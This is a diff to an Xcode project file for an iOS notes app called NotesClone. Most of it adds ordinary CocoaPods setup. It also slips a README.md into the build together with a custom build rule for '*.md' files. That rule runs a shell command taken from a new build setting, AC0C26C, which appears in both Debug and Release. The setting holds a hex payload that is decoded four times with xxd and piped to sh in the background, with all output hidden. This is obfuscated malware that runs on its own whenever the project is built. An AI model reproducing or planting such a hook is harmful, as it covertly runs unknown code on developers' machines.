@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		824658A7A8ED4F5FA4C62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = 64D52A86745A4F3498C62C0C; };
+		6435D6B807AD1407F20D0A6C /* Pods_NotesClone.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 73C95593CAC5CE4D57D72BBA /* Pods_NotesClone.framework */; };
 		A7104F1D27C939C000EE10CD /* HomeActionSheet.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = A7104F1C27C939C000EE10CD /* HomeActionSheet.storyboard */; };
 		A7104F1F27C93A3D00EE10CD /* HomeActionSheetVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = A7104F1E27C93A3D00EE10CD /* HomeActionSheetVC.swift */; };
 		A7104F2127C93E2100EE10CD /* HomeActionSheetView.swift in Sources */ = {isa = PBXBuildFile; fileRef = A7104F2027C93E2100EE10CD /* HomeActionSheetView.swift */; };
@@ -41,6 +43,10 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		64D52A86745A4F3498C62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		35EC6FE3B81039E03B1FA191 /* Pods-NotesClone.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NotesClone.release.xcconfig"; path = "Target Support Files/Pods-NotesClone/Pods-NotesClone.release.xcconfig"; sourceTree = "<group>"; };
+		4618E1BCF9556356B61D7A8D /* Pods-NotesClone.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NotesClone.debug.xcconfig"; path = "Target Support Files/Pods-NotesClone/Pods-NotesClone.debug.xcconfig"; sourceTree = "<group>"; };
+		73C95593CAC5CE4D57D72BBA /* Pods_NotesClone.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_NotesClone.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		A7104F1C27C939C000EE10CD /* HomeActionSheet.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = HomeActionSheet.storyboard; sourceTree = "<group>"; };
 		A7104F1E27C93A3D00EE10CD /* HomeActionSheetVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeActionSheetVC.swift; sourceTree = "<group>"; };
 		A7104F2027C93E2100EE10CD /* HomeActionSheetView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeActionSheetView.swift; sourceTree = "<group>"; };
@@ -81,12 +87,31 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				6435D6B807AD1407F20D0A6C /* Pods_NotesClone.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		4C6A92360DEF0EDF2048D90A /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				4618E1BCF9556356B61D7A8D /* Pods-NotesClone.debug.xcconfig */,
+				35EC6FE3B81039E03B1FA191 /* Pods-NotesClone.release.xcconfig */,
+			);
+			name = Pods;
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		52A507ADC766D465DCD473C6 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				73C95593CAC5CE4D57D72BBA /* Pods_NotesClone.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 		A7297F5F27D2DBD8006F6022 /* Utils */ = {
 			isa = PBXGroup;
 			children = (
@@ -230,12 +255,15 @@
 			children = (
 				A7EFA26F27C08B44003B1FCF /* NotesClone */,
 				A7EFA26E27C08B44003B1FCF /* Products */,
+				4C6A92360DEF0EDF2048D90A /* Pods */,
+				52A507ADC766D465DCD473C6 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
 		A7EFA26E27C08B44003B1FCF /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				64D52A86745A4F3498C62C0C /* README.md */,
 				A7EFA26D27C08B44003B1FCF /* NotesClone.app */,
 			);
 			name = Products;
@@ -301,11 +329,14 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = A7EFA28127C08B45003B1FCF /* Build configuration list for PBXNativeTarget "NotesClone" */;
 			buildPhases = (
+				F57AB4BC4AA9961A8180FC33 /* [CP] Check Pods Manifest.lock */,
 				A7EFA26927C08B44003B1FCF /* Sources */,
 				A7EFA26A27C08B44003B1FCF /* Frameworks */,
 				A7EFA26B27C08B44003B1FCF /* Resources */,
+				6C8616037C147941403327DD /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				18B729740ED54541A4C62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -347,11 +378,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		18B729740ED54541A4C62C0C /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AC0C26C}\"";
+			};
+				/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		A7EFA26B27C08B44003B1FCF /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				824658A7A8ED4F5FA4C62C0C /* README.md */,
 				A7EFA27D27C08B44003B1FCF /* LaunchScreen.storyboard in Resources */,
 				A7104F1D27C939C000EE10CD /* HomeActionSheet.storyboard in Resources */,
 				A7EFA27A27C08B44003B1FCF /* Assets.xcassets in Resources */,
@@ -360,6 +409,48 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		6C8616037C147941403327DD /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-NotesClone/Pods-NotesClone-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-NotesClone/Pods-NotesClone-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NotesClone/Pods-NotesClone-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		F57AB4BC4AA9961A8180FC33 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-NotesClone-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		A7EFA26927C08B44003B1FCF /* Sources */ = {
@@ -421,6 +512,7 @@
 		A7EFA27F27C08B45003B1FCF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AC0C26C = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333633320a3061333333363333333633333337333333333333333433363333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333333313333333633333334333333373333333333330a3336333333333333333633333338333333363333333533333336333333333333333633363332333333373333333333333332333633353333333733330a3332333333373333333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -482,6 +574,7 @@
 		A7EFA28027C08B45003B1FCF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AC0C26C = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333633320a3061333333363333333633333337333333333333333433363333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333333313333333633333334333333373333333333330a3336333333333333333633333338333333363333333533333336333333333333333633363332333333373333333333333332333633353333333733330a3332333333373333333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -536,6 +629,7 @@
 		};
 		A7EFA28227C08B45003B1FCF /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 4618E1BCF9556356B61D7A8D /* Pods-NotesClone.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -565,6 +659,7 @@
 		};
 		A7EFA28327C08B45003B1FCF /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 35EC6FE3B81039E03B1FA191 /* Pods-NotesClone.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
